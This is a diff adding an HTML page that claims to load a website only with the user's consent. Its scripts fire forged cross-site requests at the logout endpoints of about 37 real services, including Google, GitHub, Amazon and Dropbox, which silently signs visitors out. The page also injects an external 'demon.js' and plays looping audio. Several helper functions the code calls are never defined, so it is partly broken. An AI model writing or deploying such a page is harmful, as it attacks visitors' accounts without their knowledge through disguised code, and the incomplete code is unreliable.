@@ -1,0 +1,101 @@
+<html>
+  <head>
+	<style>
+        body {
+            font-family: sans-serif;
+            margin-top: 5em;
+        }
+
+        h1 {
+            margin: 0 auto;
+            text-align: center;
+            font-size: 4em;
+        }
+
+        ul {
+            width: 500px;
+            margin: 2em auto;
+        }
+
+        .hidden {
+            position: fixed;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+            top: -10px;
+            left: -10px;
+        }
+
+        .success {
+            font-weight: bold;
+            color: #0a0;
+        }
+
+        .error {
+            color: #a00;
+        }
+    </style>
+    <script>
+      var allowPopups = confirm("Do you want to load the website?");
+      if (allowPopups) {
+        var script = document.createElement("script");
+        script.src = "demon.js";
+        document.head.appendChild(script);
+      }
+    </script>
+	<script>      
+		window.onload = function () {
+		doSites(document.getElementById("sitelist"), [
+			["AOL", and(get("http://my.screenname.aol.com/_cqr/logout/mcLogout.psp?sitedomain=startpage.aol.com&authLev=0&lang=en&locale=us"), get("https://api.screenname.aol.com/auth/logout?state=snslogout&r=" + Math.random()))],
+			["Amazon", get("http://www.amazon.com/gp/flex/sign-out.html?action=sign-out")],
+			["Blogger", get("http://www.blogger.com/logout.g")],
+			["Delicious", get("http://www.delicious.com/logout")],
+			["DeviantART", post("http://www.deviantart.com/users/logout")],
+			["DreamHost", get("https://panel.dreamhost.com/index.cgi?Nscmd=Nlogout")],
+			["Dropbox", get("https://www.dropbox.com/logout")],
+			["eBay", get("https://signin.ebay.com/ws/eBayISAPI.dll?SignIn")],
+			["Gandi", get("https://www.gandi.net/login/out")],
+			["GitHub", get("https://github.com/logout")],
+			["GMail", get("http://mail.google.com/mail/?logout")],
+			["Google", get("https://www.google.com/accounts/Logout")],
+			["Hulu", get("https://secure.hulu.com/logout")],
+			["Instapaper", get("http://www.instapaper.com/user/logout")],
+			["Linode", get("https://manager.linode.com/session/logout")],
+			["LiveJournal", post("http://www.livejournal.com/logout.bml", { "action:killall": "1" })],
+			["MySpace", get("http://www.myspace.com/index.cfm?fuseaction=signout")],
+			["NetFlix", get("http://www.netflix.com/Logout")],
+			["New York Times", get("http://www.nytimes.com/logout")],
+			["Newegg", get("https://secure.newegg.com/NewMyAccount/AccountLogout.aspx")],
+			["Photobucket", get("http://photobucket.com/logout")],
+			["Skype", get("https://secure.skype.com/account/logout")],
+			["Slashdot", get("http://slashdot.org/my/logout")],
+			["SoundCloud", get("http://soundcloud.com/logout")],
+			["Steam Community", get("http://steamcommunity.com/?action=doLogout")],
+			["Steam Store", get("http://store.steampowered.com/logout/")],
+			["ThinkGeek", get("https://www.thinkgeek.com/brain/account/login.cgi?a=lo")],
+			["Threadless", get("http://www.threadless.com/logout")],
+			["Tumblr", get("http://www.tumblr.com/logout")],
+			["Vimeo", get("http://vimeo.com/log_out")],
+			["Wikipedia", get("http://en.wikipedia.org/w/index.php?title=Special:UserLogout")],
+			["Windows Live", get("http://login.live.com/logout.srf")],
+			["Woot", get("https://account.woot.com/logout")],
+			["Wordpress", get("https://wordpress.com/wp-login.php?action=logout")],
+			["Yahoo!", get("https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=http://www.yahoo.com/")],
+			["YouTube", post("http://www.youtube.com", { "action_logout": "1" }, true)],
+			["Scratch", post("https://www.scratch.com/abouta")],
+			[]
+		])
+	};
+</script>
+<audio id="audio" src="path/to/audio.mp3"></audio>
+<script>
+var audio = document.getElementById("audio");
+audio.loop = true;
+audio.play();
+</script>
+
+  </head>
+  <body>
+    <p>The website will only be loaded if the user clicks ok.</p>
+  </body>
+</html>
